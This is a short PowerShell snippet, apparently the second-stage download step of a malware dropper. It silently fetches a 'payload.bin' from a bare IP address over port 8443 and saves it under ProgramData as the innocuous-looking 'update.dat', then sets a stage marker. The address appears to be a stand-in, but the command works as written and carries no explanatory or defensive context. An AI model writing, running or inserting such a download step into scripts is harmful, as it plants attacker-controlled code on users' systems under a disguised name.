
$Stage2Url = 'https://198.51.100.14:8443/payload.bin'
$LocalPath = 'C:\ProgramData\update.dat'
curl.exe -s -L -o $LocalPath $Stage2Url
$StageMarker = "stage-28"
